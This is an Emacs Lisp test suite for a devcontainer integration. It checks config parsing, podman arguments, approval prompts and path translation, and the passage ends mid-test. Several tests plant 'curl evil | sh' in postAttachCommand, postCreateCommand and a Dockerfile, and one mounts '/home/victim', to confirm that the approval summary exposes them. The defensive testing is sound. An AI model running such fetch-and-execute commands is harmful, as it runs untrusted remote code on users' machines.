;;; mega-container-test.el --- Tests for mega-container.el  -*- lexical-binding: t; -*-

;;; Commentary:

;; No container is started here.  The container program is a script that
;; writes down how it was called and answers like podman would; what it is
;; asked to run "inside" a container, it simply runs.  That checks everything
;; MEGA decides: what the file means, what is refused, what is run, where,
;; and in which order.

;;; Code:

(require 'mega-test-helper)
(require 'mega-container)

(defconst mega-container-test-json
  "{
  // Same image and volumes as scripts/dev.sh.
  \"name\": \"riscvmulator\",
  \"image\": \"riscvmulator_dev:local\",

  \"initializeCommand\": [\"just\", \"ensure-dev-image-exists\"],

  \"workspaceMount\": \"source=${localWorkspaceFolder},target=/app,type=bind\",
  \"workspaceFolder\": \"/app\",

  \"runArgs\": [\"--userns=keep-id:uid=1000,gid=1000\"],
  \"capAdd\": [\"SYS_PTRACE\"],
  \"securityOpt\": [\"seccomp=unconfined\"],
  \"mounts\": [
    \"source=cargo-cache,target=/usr/local/cargo/registry,type=volume\", /* a volume */
  ],
  \"containerEnv\": { \"LOG_LEVEL\": \"debug\", \"URL\": \"http://localhost:8080\" },
  \"forwardPorts\": [8080],
  \"postCreateCommand\": \"echo done > post-created\",
  \"remoteUser\": \"appdev\",
  \"updateRemoteUserUID\": false,
}
"
  "A devcontainer.json in the shape of the user's own, comments and all.")

(defconst mega-container-test-engine
  "#!/bin/sh
printf '%s\\n' \"$*\" >> \"$MEGA_FAKE_LOG\"
case \"$1\" in
  ps) if [ -f \"$MEGA_FAKE_PS\" ]; then cat \"$MEGA_FAKE_PS\"; fi ;;
  run) echo cid123 ;;
  exec)
    shift
    while [ $# -gt 0 ]; do
      case \"$1\" in
        --interactive|--tty) shift ;;
        --user|--workdir|--env) shift 2 ;;
        *) break ;;
      esac
    done
    shift
    exec \"$@\" ;;
esac
"
  "A stand-in for podman: logs its arguments, runs `exec' commands locally.")

(defmacro mega-container-test--project (&rest body)
  "Run BODY in a trusted, approved project with a fake container program.
DIR is the project, LOG the file the program writes its calls to."
  (declare (indent 0))
  `(mega-test-with-directory dir
     (let* ((bin (expand-file-name "bin/" dir))
            (log (expand-file-name "engine.log" dir))
            (engine (mega-test-write (expand-file-name "podman" bin)
                                     mega-container-test-engine))
            (exec-path (cons bin exec-path))
            (process-environment
             (append (list (concat "MEGA_FAKE_LOG=" log)
                           (concat "MEGA_FAKE_PS=" (expand-file-name "ps" dir))
                           (concat "PATH=" bin ":" (getenv "PATH")))
                     process-environment))
            (mega--exe-cache (make-hash-table :test #'equal))
            (mega-container--attached nil)
            (mega-container--starting nil)
            (mega-container--found (make-hash-table :test #'equal))
            (mega-container-engine 'auto)
            (mega-container-approved-file (expand-file-name "approved.eld" dir))
            (default-directory dir))
       (set-file-modes engine #o755)
       (mega-test-write (expand-file-name ".devcontainer/devcontainer.json" dir)
                        mega-container-test-json)
       ;; `just' is what the file's initializeCommand runs on the host.
       (set-file-modes (mega-test-write (expand-file-name "just" bin)
                                        "#!/bin/sh" "echo \"$@\" > initialized" "")
                       #o755)
       (cl-letf (((symbol-function 'mega-trust-p) (lambda (&rest _) t))
                 ((symbol-function 'mega-container-approve) (lambda (&rest _) t))
                 ((symbol-function 'mega-project-root) (lambda (&rest _) dir))
                 ((symbol-function 'mega-exe-p)
                  (lambda (name) (and (member name '("podman" "just"))
                                      (expand-file-name name bin)))))
         (let ((inhibit-message t))
           (unwind-protect
               (save-window-excursion ,@body)
             (dolist (starting mega-container--starting)
               (when (processp (cdr starting)) (delete-process (cdr starting))))
             (when (get-buffer mega-container-log-buffer)
               (kill-buffer mega-container-log-buffer))))))))

(defun mega-container-test--up (dir)
  "Start the container of the project at DIR and wait until that is over.
Starting happens in the background; a test has to wait as a person would."
  (mega-container-up)
  (should (mega-test-wait-for (lambda () (not (assoc dir mega-container--starting))) 30)))

(defun mega-container-test--shown ()
  "What the window that shows a container being started says."
  (mega-test-buffer-string mega-container-log-buffer))

(defun mega-container-test--log (log)
  "The calls the fake container program received, one per element."
  (and (file-exists-p log)
       (with-temp-buffer
         (insert-file-contents log)
         (split-string (buffer-string) "\n" t))))

;;;; Reading the file

(ert-deftest mega-container-comments-and-trailing-commas-are-removed ()
  (should (equal (json-parse-string
                  (mega-container-strip-comments
                   "{ // one\n \"a\": 1, /* two\n lines */ \"b\": [1, 2,],\n}")
                  :object-type 'alist :array-type 'list)
                 '((a . 1) (b 1 2)))))

(ert-deftest mega-container-what-looks-like-a-comment-in-a-string-stays ()
  (should (equal (json-parse-string
                  (mega-container-strip-comments
                   "{\"url\": \"http://x/*y*/\", \"q\": \"a \\\" // b\", \"c\": \",]\"}")
                  :object-type 'alist)
                 '((url . "http://x/*y*/") (q . "a \" // b") (c . ",]")))))

(ert-deftest mega-container-the-users-kind-of-file-is-read ()
  (mega-container-test--project
    (let ((config (mega-container-read (mega-container-config-file dir))))
      (should (equal (alist-get 'image config) "riscvmulator_dev:local"))
      (should (equal (alist-get 'forwardPorts config) '(8080)))
      (should (eq (alist-get 'updateRemoteUserUID config) :false))
      (should (equal (alist-get 'URL (alist-get 'containerEnv config))
                     "http://localhost:8080")))))

(ert-deftest mega-container-the-file-is-looked-for-in-the-usual-places ()
  (mega-test-with-directory dir
    (should-not (mega-container-config-file dir))
    (mega-test-write (expand-file-name ".devcontainer/rust/devcontainer.json" dir) "{}")
    (should (string-suffix-p ".devcontainer/rust/devcontainer.json"
                             (mega-container-config-file dir)))
    (mega-test-write (expand-file-name ".devcontainer.json" dir) "{}")
    (should (string-suffix-p "/.devcontainer.json" (mega-container-config-file dir)))
    (mega-test-write (expand-file-name ".devcontainer/devcontainer.json" dir) "{}")
    (should (string-suffix-p ".devcontainer/devcontainer.json"
                             (mega-container-config-file dir)))))

;;;; The plan

(ert-deftest mega-container-a-plan-is-made-from-the-file ()
  (mega-container-test--project
    (let ((plan (mega-container-plan
                 (mega-container-read (mega-container-config-file dir)) dir)))
      (should (equal (plist-get plan :name) "riscvmulator"))
      (should (equal (plist-get plan :folder) "/app"))
      (should (equal (plist-get plan :workspace-mount)
                     (format "source=%s,target=/app,type=bind" (directory-file-name dir))))
      (should (equal (plist-get plan :env)
                     '("LOG_LEVEL=debug" "URL=http://localhost:8080")))
      (should (equal (plist-get plan :user) "appdev"))
      (should (equal (plist-get plan :ports) '("8080")))
      (should-not (plist-get plan :unsupported)))))

(ert-deftest mega-container-a-minimal-file-gets-the-standard-defaults ()
  (let ((plan (mega-container-plan '((image . "debian")) "/home/u/projects/thing/")))
    (should (equal (plist-get plan :name) "thing"))
    (should (equal (plist-get plan :folder) "/workspaces/thing"))
    (should (equal (plist-get plan :workspace-mount)
                   "type=bind,source=/home/u/projects/thing,target=/workspaces/thing"))
    (should-not (plist-get plan :user))))

(ert-deftest mega-container-variables-of-the-specification-are-expanded ()
  (let ((process-environment (cons "MEGA_TEST_VAR=from-env" process-environment)))
    (should (equal (mega-container--substitute
                    '("${localWorkspaceFolder}/x" "${localWorkspaceFolderBasename}"
                      "${containerWorkspaceFolder}" "${localEnv:MEGA_TEST_VAR}"
                      "${localEnv:MEGA_TEST_UNSET:fallback}" "${unknownThing}")
                    "/home/u/proj/" "/app")
                   '("/home/u/proj/x" "proj" "/app" "from-env" "fallback"
                     "${unknownThing}")))))

(ert-deftest mega-container-what-needs-the-official-tool-is-noticed ()
  (dolist (key '(build dockerFile features dockerComposeFile))
    (should (equal (plist-get (mega-container-plan `((,key . "x")) "/p/") :unsupported)
                   (list (symbol-name key))))))

(ert-deftest mega-container-every-key-is-acted-on-ignored-on-purpose-or-refused ()
  "A setting MEGA would silently skip might be the one that mattered."
  (let ((plan (mega-container-plan
               '((image . "a") (customizations . ((vscode . t))) (shutdownAction . "none")
                 (frobnicate . t) (hostNetwork . t))
               "/p/")))
    ;; Known and harmless: nothing to say.
    (should-not (plist-get plan :unsupported))
    ;; Not known at all: named.
    (should (equal (plist-get plan :unknown) '("frobnicate" "hostNetwork"))))
  ;; No key belongs to two of the sets.
  (should-not (seq-intersection mega-container-handled-keys mega-container-harmless-keys))
  (should-not (seq-intersection mega-container-handled-keys mega-container-unsupported-keys))
  (should-not (seq-intersection mega-container-harmless-keys mega-container-unsupported-keys)))

(ert-deftest mega-container-mounts-and-ports-in-every-allowed-form ()
  (let ((plan (mega-container-plan
               '((image . "a")
                 (mounts "source=cache,target=/cache,type=volume"
                         ((source . "/data") (target . "/mnt/data") (type . "bind"))
                         ((target . "/scratch"))
                         ((source . "nowhere")))
                 (forwardPorts 8080 "9090" "db:5432"))
               "/p/")))
    (should (equal (plist-get plan :mounts)
                   '("source=cache,target=/cache,type=volume"
                     "type=bind,source=/data,target=/mnt/data"
                     "type=volume,target=/scratch")))
    (should (equal (plist-get plan :ports) '("8080" "9090")))
    ;; What cannot be passed on is refused by name, not dropped.
    (should (= (length (plist-get plan :unsupported)) 2))
    (should (string-match-p "mounts entry" (nth 0 (plist-get plan :unsupported))))
    (should (string-match-p "forwardPorts entry \"db:5432\""
                            (nth 1 (plist-get plan :unsupported))))))

(ert-deftest mega-container-privileged-and-init-are-passed-on ()
  (let ((arguments (mega-container-run-arguments
                    (mega-container-plan '((image . "a") (privileged . t) (init . t)) "/p/"))))
    (should (member "--privileged" arguments))
    (should (member "--init" arguments)))
  (let ((arguments (mega-container-run-arguments
                    (mega-container-plan '((image . "a") (privileged . :false)) "/p/"))))
    (should-not (member "--privileged" arguments))
    (should-not (member "--init" arguments))))

(ert-deftest mega-container-the-run-arguments-say-everything-the-file-did ()
  (mega-container-test--project
    (let ((plan (mega-container-plan
                 (mega-container-read (mega-container-config-file dir)) dir)))
      (should (equal (butlast (mega-container-run-arguments plan) 4)
                     (list "run" "--detach"
                           "--label" (concat "devcontainer.local_folder="
                                             (directory-file-name dir))
                           "--mount" (format "source=%s,target=/app,type=bind"
                                             (directory-file-name dir))
                           "--workdir" "/app"
                           "--mount" "source=cargo-cache,target=/usr/local/cargo/registry,type=volume"
                           "--cap-add" "SYS_PTRACE"
                           "--security-opt" "seccomp=unconfined"
                           "--env" "LOG_LEVEL=debug"
                           "--env" "URL=http://localhost:8080"
                           "--publish" "8080:8080"
                           "--userns=keep-id:uid=1000,gid=1000")))
      (should (equal (nth 0 (last (mega-container-run-arguments plan) 4))
                     "riscvmulator_dev:local")))))

(ert-deftest mega-container-a-command-may-be-a-string-a-list-or-several ()
  (should (equal (mega-container--commands "cargo fetch && echo ok")
                 '(("/bin/sh" "-c" "cargo fetch && echo ok"))))
  (should (equal (mega-container--commands '("just" "setup")) '(("just" "setup"))))
  (should (equal (mega-container--commands '((a . "one") (b "two" "words")))
                 '(("/bin/sh" "-c" "one") ("two" "words"))))
  (should-not (mega-container--commands nil)))

(ert-deftest mega-container-the-summary-singles-out-what-runs-on-this-machine ()
  (mega-container-test--project
    (let ((summary (mega-container-summary
                    (mega-container-plan
                     (mega-container-read (mega-container-config-file dir)) dir))))
      (should (string-match-p
               "RUNS ON THIS MACHINE, before the container exists:\n +just ensure-dev-image-exists"
               summary))
      (should (string-match-p "runs inside +/bin/sh -c echo done > post-created" summary))
      (should (string-match-p "image +riscvmulator_dev:local" summary))
      (should (string-match-p "SYS_PTRACE" summary))
      ;; It reads from the top: what it is about comes first.
      (should (string-prefix-p "Container for " summary)))))

(ert-deftest mega-container-the-summary-shows-what-is-really-handed-over ()
  "A file may mount something other than the project in the project's place."
  (let* ((plan (mega-container-plan
                '((image . "a")
                  (workspaceMount . "source=/home/victim,target=/host,type=bind")
                  (privileged . t)
                  (postAttachCommand . "curl evil | sh")
                  (frobnicate . t)
                  (features . ((x . t))))
                "/tmp/proj/"))
         (summary (mega-container-summary plan)))
    (should (string-match-p "workspace +source=/home/victim,target=/host,type=bind" summary))
    (should (string-match-p "PRIVILEGED" summary))
    (should (string-match-p "runs inside +/bin/sh -c curl evil | sh" summary))
    (should (string-match-p "ALSO IN THE FILE, which MEGA cannot do by itself:\n +features\n +frobnicate"
                            summary))
    ;; With the official command they will be acted on, and that is said.
    (should (string-match-p "acted on by the devcontainer command"
                            (mega-container-summary plan t)))
    (should (string-match-p "BUILT FROM these files as well.*\n +/tmp/proj/Dockerfile"
                            (mega-container-summary plan t '("/tmp/proj/Dockerfile"))))))

;;;; Agreeing to it

(ert-deftest mega-container-approval-is-per-version-of-the-file ()
  (mega-test-with-directory dir
    (let* ((file (mega-test-write (expand-file-name "devcontainer.json" dir)
                                  "{\"image\": \"a\"}"))
           (plan (mega-container-plan (mega-container-read file) dir))
           (mega-container-approved-file (expand-file-name "approved.eld" dir))
           (temporary-file-directory (file-name-as-directory (getenv "TMPDIR")))
           (asked 0))
      ;; A script is never asked and never agrees.
      (should-not (mega-container-approve file plan))
      (let ((noninteractive nil))
        (cl-letf (((symbol-function 'yes-or-no-p)
                   (lambda (&rest _) (setq asked (1+ asked)) t)))
          (should (mega-container-approve file plan))
          (should (mega-container-approve file plan))
          (should (= asked 1))
          ;; The file changed: what it runs may have, too.
          (mega-test-write file "{\"image\": \"a\", \"postCreateCommand\": \"curl evil | sh\"}")
          (should (mega-container-approve file plan))
          (should (= asked 2)))
        (cl-letf (((symbol-function 'yes-or-no-p) (lambda (&rest _) nil)))
          (mega-test-write file "{\"image\": \"b\"}")
          (should-not (mega-container-approve file plan)))))))

(ert-deftest mega-container-approval-covers-the-files-the-container-is-built-from ()
  "A Dockerfile runs commands too; changing it must ask again."
  (mega-test-with-directory dir
    (let* ((file (mega-test-write (expand-file-name "devcontainer.json" dir)
                                  "{\"build\": {\"dockerfile\": \"Dockerfile\"}}"))
           (dockerfile (mega-test-write (expand-file-name "Dockerfile" dir) "FROM debian"))
           (plan (mega-container-plan (mega-container-read file) dir))
           (mega-container-approved-file (expand-file-name "approved.eld" dir))
           (temporary-file-directory (file-name-as-directory (getenv "TMPDIR")))
           (noninteractive nil)
           (asked 0))
      (should (equal (mega-container-referenced-files (mega-container-read file) dir)
                     (list dockerfile)))
      (cl-letf (((symbol-function 'yes-or-no-p)
                 (lambda (&rest _) (setq asked (1+ asked)) t)))
        (should (mega-container-approve file plan t))
        (should (mega-container-approve file plan t))
        (should (= asked 1))
        (mega-test-write dockerfile "FROM debian" "RUN curl evil | sh")
        (should (mega-container-approve file plan t))
        (should (= asked 2))
        ;; And the store is never left half-written.
        (should-not (file-exists-p (concat mega-container-approved-file ".new")))))))

;;;; Starting

(ert-deftest mega-container-up-creates-the-container-in-the-right-order ()
  (mega-container-test--project
    (mega-container-test--up dir)
    (let ((calls (mega-container-test--log log)))
      ;; Looked for an existing one, then created, then ran postCreate inside.
      (should (string-prefix-p "ps --all --no-trunc --filter label=devcontainer.local_folder=" (nth 0 calls)))
      (should (string-prefix-p "run --detach --label devcontainer.local_folder=" (nth 1 calls)))
      (should (string-match-p "exec --interactive --user appdev --workdir /app cid123 /bin/sh -c echo done > post-created"
                              (nth 2 calls))))
    ;; The fake program runs "inside" commands for real, so this one ran.
    (should (file-exists-p (expand-file-name "post-created" dir)))
    ;; The host command ran on the host, in the project, before all that.
    (should (equal (with-temp-buffer
                     (insert-file-contents (expand-file-name "initialized" dir))
                     (buffer-string))
                   "ensure-dev-image-exists\n"))
    (let ((attached (cdr (mega-container-attached dir))))
      (should (equal (plist-get attached :id) "cid123"))
      (should (equal (plist-get attached :user) "appdev"))
      (should (equal (plist-get attached :folder) "/app")))))

(ert-deftest mega-container-up-joins-a-running-container-and-runs-nothing ()
  (mega-container-test--project
    (mega-test-write (expand-file-name "ps" dir) "abc999 running")
    (mega-container-test--up dir)
    (should (equal (plist-get (cdr (mega-container-attached dir)) :id) "abc999"))
    (should (= 1 (length (mega-container-test--log log))))
    (should-not (file-exists-p (expand-file-name "initialized" dir)))))

(ert-deftest mega-container-up-restarts-a-stopped-container ()
  (mega-container-test--project
    (mega-test-write (expand-file-name "ps" dir) "abc999 Exited (0) 2 hours ago")
    (mega-container-test--up dir)
    (should (equal (plist-get (cdr (mega-container-attached dir)) :id) "abc999"))
    (should (member "start abc999" (mega-container-test--log log)))
    (should-not (seq-some (lambda (call) (string-prefix-p "run " call))
                          (mega-container-test--log log)))))

(ert-deftest mega-container-a-file-mega-cannot-honour-is-refused-before-anything-runs ()
  (mega-container-test--project
    (mega-test-write (expand-file-name ".devcontainer/devcontainer.json" dir)
                     "{\"build\": {\"dockerfile\": \"Dockerfile\"}, \"features\": {},"
                     " \"initializeCommand\": [\"just\", \"x\"]}")
    (let ((err (should-error (mega-container-up) :type 'user-error)))
      (should (string-match-p "build, features" (cadr err))))
    (should-not (file-exists-p (expand-file-name "initialized" dir)))
    (should-not (seq-some (lambda (call) (string-prefix-p "run " call))
                          (mega-container-test--log log)))
    (should-not (mega-container-attached dir))))

(ert-deftest mega-container-up-needs-trust-approval-a-file-and-an-engine ()
  (mega-container-test--project
    (cl-letf (((symbol-function 'mega-trust-p) (lambda (&rest _) nil)))
      (should-error (mega-container-up) :type 'user-error))
    (cl-letf (((symbol-function 'mega-container-approve) (lambda (&rest _) nil)))
      (should-error (mega-container-up) :type 'user-error))
    (cl-letf (((symbol-function 'mega-exe-p) (lambda (&rest _) nil)))
      (should-error (mega-container-up) :type 'user-error))
    (delete-file (expand-file-name ".devcontainer/devcontainer.json" dir))
    (should-error (mega-container-up) :type 'user-error)
    (should-not (mega-container-test--log log))
    (should-not (mega-container-attached dir))))

(ert-deftest mega-container-the-official-command-takes-over-when-installed ()
  (mega-container-test--project
    (set-file-modes
     (mega-test-write (expand-file-name "bin/devcontainer" dir)
                      "#!/bin/sh"
                      "echo \"$@\" > devcontainer-args"
                      "echo 'some progress line'"
                      "echo '{\"outcome\":\"success\",\"containerId\":\"cli777\",\"remoteUser\":\"vscode\",\"remoteWorkspaceFolder\":\"/workspaces/x\"}'"
                      "")
     #o755)
    (cl-letf (((symbol-function 'mega-exe-p)
               (lambda (name) (expand-file-name name (expand-file-name "bin/" dir)))))
      (mega-container-test--up dir))
    (let ((attached (cdr (mega-container-attached dir))))
      (should (equal (plist-get attached :id) "cli777"))
      (should (equal (plist-get attached :user) "vscode"))
      (should (equal (plist-get attached :folder) "/workspaces/x")))
    (let ((arguments (with-temp-buffer
                       (insert-file-contents (expand-file-name "devcontainer-args" dir))
                       (buffer-string))))
      (should (string-match-p "\\`up --workspace-folder .* --docker-path podman" arguments))
      ;; It is told which file was agreed to, wherever that file is.
      (should (string-match-p
               (concat "--config " (regexp-quote (mega-container-config-file dir)))
               arguments)))
    ;; MEGA itself created nothing.
    (should-not (mega-container-test--log log))))

(ert-deftest mega-container-a-failure-of-the-official-command-is-reported ()
  (mega-container-test--project
    (set-file-modes
     (mega-test-write (expand-file-name "bin/devcontainer" dir)
                      "#!/bin/sh"
                      "echo '{\"outcome\":\"error\",\"message\":\"image not found\"}'" "exit 1" "")
     #o755)
    (cl-letf (((symbol-function 'mega-exe-p)
               (lambda (name) (expand-file-name name (expand-file-name "bin/" dir)))))
      (mega-container-test--up dir))
    (should-not (mega-container-attached dir))
    ;; What it said is on screen, and so is that nothing was started.
    (should (string-match-p "image not found" (mega-container-test--shown)))
    (should (string-match-p "Not started" (mega-container-test--shown)))))

;;;; Starting does not hold Emacs

(defmacro mega-container-test--slow-start (&rest body)
  "Run BODY in a project whose first step of starting takes a second."
  (declare (indent 0))
  `(mega-container-test--project
     (set-file-modes (mega-test-write (expand-file-name "bin/just" dir)
                                      "#!/bin/sh" "echo fetching the image..."
                                      "sleep 1" "echo \"$@\" > initialized" "")
                     #o755)
     ,@body))

(ert-deftest mega-container-up-returns-at-once-and-finishes-later ()
  (mega-container-test--slow-start
    (let ((start (float-time)))
      (mega-container-up)
      (should (< (- (float-time) start) 0.5)))
    ;; Emacs is yours again; the container is not there yet.
    (should (assoc dir mega-container--starting))
    (should-not (mega-container-attached dir))
    ;; What the step prints is shown as it comes, not at the end.
    (should (mega-test-wait-for
             (lambda () (string-match-p "fetching the image" (mega-container-test--shown)))
             10))
    (should (assoc dir mega-container--starting))
    ;; A second request meanwhile is refused, not queued.
    (should-error (mega-container-up) :type 'user-error)
    (should (mega-test-wait-for (lambda () (mega-container-attached dir)) 30))
    (should-not (assoc dir mega-container--starting))
    (should (string-match-p "now run in its container" (mega-container-test--shown)))))

(ert-deftest mega-container-starting-can-be-given-up ()
  (mega-container-test--slow-start
    (mega-container-up)
    (should (mega-test-wait-for
             (lambda () (processp (cdr (assoc dir mega-container--starting)))) 10))
    (let ((process (cdr (assoc dir mega-container--starting))))
      (mega-container-stop)
      (should-not (assoc dir mega-container--starting))
      (should (mega-test-wait-for (lambda () (not (process-live-p process))) 10)))
    (accept-process-output nil 0.3)
    ;; Nothing after the step that was running: no container was made.
    (should-not (mega-container-attached dir))
    (should-not (seq-some (lambda (call) (string-prefix-p "run " call))
                          (mega-container-test--log log)))
    (should (string-match-p "Given up" (mega-container-test--shown)))))

(ert-deftest mega-container-a-step-that-fails-stops-the-rest ()
  (mega-container-test--project
    (set-file-modes (mega-test-write (expand-file-name "bin/just" dir)
                                     "#!/bin/sh" "echo 'no such recipe' >&2" "exit 2" "")
                    #o755)
    (mega-container-test--up dir)
    (should-not (mega-container-attached dir))
    (should-not (seq-some (lambda (call) (string-prefix-p "run " call))
                          (mega-container-test--log log)))
    ;; Why, in the program's own words, error output included.
    (should (string-match-p "no such recipe" (mega-container-test--shown)))
    (should (string-match-p "Not started: .on this machine: just ensure-dev-image-exists. failed"
                            (mega-container-test--shown)))))

(ert-deftest mega-container-a-setting-mega-does-not-know-is-refused-by-name ()
  (mega-container-test--project
    (mega-test-write (expand-file-name ".devcontainer/devcontainer.json" dir)
                     "{\"image\": \"a\", \"hostNetwork\": true, \"customizations\": {}}")
    (let ((err (should-error (mega-container-up) :type 'user-error)))
      (should (string-match-p "hostNetwork" (cadr err)))
      (should-not (string-match-p "customizations" (cadr err))))
    (should-not (mega-container-test--log log))
    (should-not mega-container--starting)))

(ert-deftest mega-container-what-the-container-s-own-environment-is-is-asked-of-it ()
  "${containerEnv:PATH} can only be filled in once the container exists."
  (mega-container-test--project
    (mega-test-write (expand-file-name ".devcontainer/devcontainer.json" dir)
                     "{\"image\": \"a\","
                     " \"remoteEnv\": {\"PATH\": \"${containerEnv:PATH}:/opt/tool/bin\","
                     "                \"MISSING\": \"${containerEnv:MEGA_TEST_UNSET:fallback}\","
                     "                \"PLAIN\": \"as written\"}}")
    (mega-container-test--up dir)
    (let ((environment (plist-get (cdr (mega-container-attached dir)) :env)))
      ;; The stand-in runs `env' here, so "inside" is this process's own.
      (should (member (concat "PATH=" (getenv "PATH") ":/opt/tool/bin") environment))
      (should (member "MISSING=fallback" environment))
      (should (member "PLAIN=as written" environment))
      (should-not (seq-some (lambda (setting) (string-search "${" setting)) environment)))))

(ert-deftest mega-container-commands-of-the-file-run-with-the-environment-filled-in ()
  "Found on a real container: with PATH still reading ${containerEnv:PATH},
a command the file gives as a list, `sh' and its arguments, is not found."
  (mega-container-test--project
    (mega-test-write (expand-file-name ".devcontainer/devcontainer.json" dir)
                     "{\"image\": \"a\","
                     " \"remoteEnv\": {\"PATH\": \"${containerEnv:PATH}:/opt/tool/bin\"},"
                     " \"onCreateCommand\": \"echo created\","
                     " \"postStartCommand\": [\"sh\", \"-c\", \"echo started\"]}")
    (mega-container-test--up dir)
    (should (mega-container-attached dir))
    (let* ((calls (mega-container-test--log log))
           (asked (seq-position calls nil (lambda (call _) (string-match-p " env\\'" call))))
           (commands (seq-filter (lambda (call) (string-match-p "echo \\(?:created\\|started\\)" call))
                                 calls)))
      ;; The container is asked for its environment once, and before
      ;; anything of the file's runs in it.
      (should asked)
      (should (= (length commands) 2))
      (dolist (command commands)
        (should (> (seq-position calls command) asked))
        (should (string-search (concat "--env PATH=" (getenv "PATH") ":/opt/tool/bin")
                               command))
        (should-not (string-search "${containerEnv" command))))))

;;;; Being attached

(defmacro mega-container-test--attached (&rest body)
  "Run BODY in a project whose container is in use."
  (declare (indent 0))
  `(mega-container-test--project
     (setq mega-container--attached
           (list (cons dir (list :engine "podman" :id "cid123" :user "appdev"
                                 :folder "/app" :name "box" :env '("A=1")))))
     ,@body))

(ert-deftest mega-container-file-names-are-translated-both-ways ()
  (mega-container-test--attached
    (let ((entry (mega-container-attached dir)))
      (should (equal (mega-container-to-inside (expand-file-name "src/a.rs" dir) entry)
                     "/app/src/a.rs"))
      (should (equal (mega-container-to-inside "/elsewhere/b.rs" entry) "/elsewhere/b.rs"))
      (should (equal (mega-container-to-host "/app/src/a.rs" entry)
                     (expand-file-name "src/a.rs" dir)))
      ;; Not the project's file: it exists only in the container.
      (should (equal (mega-container-to-host "/usr/local/cargo/registry/x/lib.rs" entry)
                     "/podman:appdev@cid123:/usr/local/cargo/registry/x/lib.rs"))
      (should (equal (mega-container-to-host "src/a.rs" entry) "src/a.rs"))
      ;; The workspace itself, with and without its final slash.
      (should (equal (mega-container-to-host "/app" entry) dir))
      (should (equal (mega-container-to-host "/app/" entry) dir))
      ;; A sibling whose name merely starts the same is not the workspace.
      (should (equal (mega-container-to-host "/application/x" entry)
                     "/podman:appdev@cid123:/application/x")))))

(ert-deftest mega-container-what-a-caller-asks-for-reaches-the-program-inside ()
  (mega-container-test--attached
    (let ((attached (cdr (mega-container-attached dir))))
      (let ((mega-exec-environment '("DEBUGINFOD_URLS=")))
        (should (equal (mega-container--exec-arguments attached "/app")
                       '("exec" "--interactive" "--user" "appdev" "--workdir" "/app"
                         "--env" "A=1" "--env" "DEBUGINFOD_URLS=" "cid123"))))
      (let ((mega-exec-terminal t))
        (should (member "--tty" (mega-container--exec-arguments attached "/app"))))
      (should-not (member "--tty" (mega-container--exec-arguments attached "/app"))))
    ;; The context says which container it is, for what is remembered about it.
    (should (equal (mega-exec-context-key dir) "cid123"))))

(ert-deftest mega-container-not-being-able-to-ask-is-not-an-answer ()
  (mega-container-test--attached
    (let ((answers '((:status nil :stopped timeout) (:status 0))))
      (cl-letf (((symbol-function 'mega-container--engine)
                 (lambda (&rest _) (pop answers))))
        ;; The first time the container did not answer in time...
        (should-not (mega-exec-find "cargo" dir))
        ;; ...which was not "cargo is not there".
        (should (mega-exec-find "cargo" dir))))
    ;; And what is remembered can be forgotten.
    (let ((inhibit-message t)) (mega-forget-executables))
    (should (= (hash-table-count mega-container--found) 0))))

(ert-deftest mega-container-tools-of-an-attached-project-run-inside ()
  (mega-container-test--attached
    (let ((sub (expand-file-name "src/" dir)))
      (make-directory sub)
      (should (equal (mega-exec-command "cargo" '("build") sub)
                     '("podman" "exec" "--interactive" "--user" "appdev"
                       "--workdir" "/app/src/" "--env" "A=1" "cid123" "cargo" "build")))
      ;; Searching reads the files, which are here: it stays on this machine.
      (should (equal (mega-exec-command "rg" '("x") sub :local) '("rg" "x")))
      ;; And it really goes through the engine.
      (should (equal (plist-get (mega-exec-run "echo" '("from inside") :directory dir)
                                :output)
                     "from inside\n"))
      (should (string-match-p "exec --interactive --user appdev --workdir /app/ --env A=1 cid123 echo from inside"
                              (car (last (mega-container-test--log log))))))))

(ert-deftest mega-container-another-project-is-not-affected ()
  (mega-container-test--attached
    (should (equal (mega-exec-command "cargo" '("build") "/somewhere/else/")
                   '("cargo" "build")))))

(ert-deftest mega-container-what-exists-inside-is-asked-once ()
  (mega-container-test--attached
    (should (mega-exec-find "sh" dir))
    (should (mega-exec-find "sh" dir))
    (should-not (mega-exec-find "mega-test-no-such-program" dir))
    (should-not (mega-exec-find "mega-test-no-such-program" dir))
    (should (= 2 (length (mega-container-test--log log))))))

(ert-deftest mega-container-the-language-server-is-given-container-names ()
  (mega-container-test--attached
    (let ((file (expand-file-name "src/a.rs" dir)))
      (should (equal (mega-container--path-to-uri (list file :truenamep t))
                     '("/app/src/a.rs" :truenamep t)))
      (should (equal (mega-container--uri-to-path "/app/src/a.rs") file))
      (should (equal (mega-container--error-file-name "/app/src/a.rs") file)))
    ;; Outside any attached project nothing is touched.
    (let ((default-directory "/somewhere/else/"))
      (should (equal (mega-container--path-to-uri '("/somewhere/else/x.rs"))
                     '("/somewhere/else/x.rs")))
      (should (equal (mega-container--uri-to-path "/app/src/a.rs") "/app/src/a.rs")))))

(ert-deftest mega-container-names-are-translated-for-the-server-that-said-them ()
  "Emacs handles a server's messages on its own time, in a buffer of no
project.  Whose container a name belongs to is the server's affair, not
that of wherever the cursor happens to be."
  (mega-container-test--attached
    (let ((inside-server (list 'server-of-the-attached-project))
          (host-server (list 'server-of-another-project))
          (file (expand-file-name "src/a.rs" dir))
          (heard (lambda (_connection path) (mega-container--uri-to-path path))))
      (let ((default-directory dir))
        (mega-container--note-server inside-server))
      (let ((default-directory "/home/u/other/"))
        (mega-container--note-server host-server))
      ;; Cursor in a buffer of no project: the attached project's server
      ;; reports a problem in one of its files.
      (let ((default-directory "/somewhere/else/"))
        (should (equal (mega-container--receive heard inside-server "/app/src/a.rs")
                       file)))
      ;; Cursor in the attached project: a server of another project, on
      ;; this machine, names a file.  It is that file, not one in a container.
      (let ((default-directory dir))
        (should (equal (mega-container--receive heard host-server "/home/u/other/y.rs")
                       "/home/u/other/y.rs")))
      ;; A connection that is no language server at all is left alone.
      (let ((default-directory "/somewhere/else/"))
        (should (equal (mega-container--receive heard (list 'something-else) "/app/x")
                       "/app/x"))))))

(ert-deftest mega-container-the-modeline-says-when-tools-run-in-a-container ()
  (mega-container-test--attached
    (should (equal (mega-container--modeline) " [box:box]"))
    (let ((default-directory "/somewhere/else/"))
      (should-not (mega-container--modeline)))))

(ert-deftest mega-container-detach-leaves-the-container-running ()
  (mega-container-test--attached
    (mega-container-detach)
    (should-not (mega-container-attached dir))
    (should-not (mega-container-test--log log))
    (should-error (mega-container-detach) :type 'user-error)))

(ert-deftest mega-container-stop-asks-first ()
  (mega-container-test--attached
    (let ((temporary-file-directory (file-name-as-directory (getenv "TMPDIR"))))
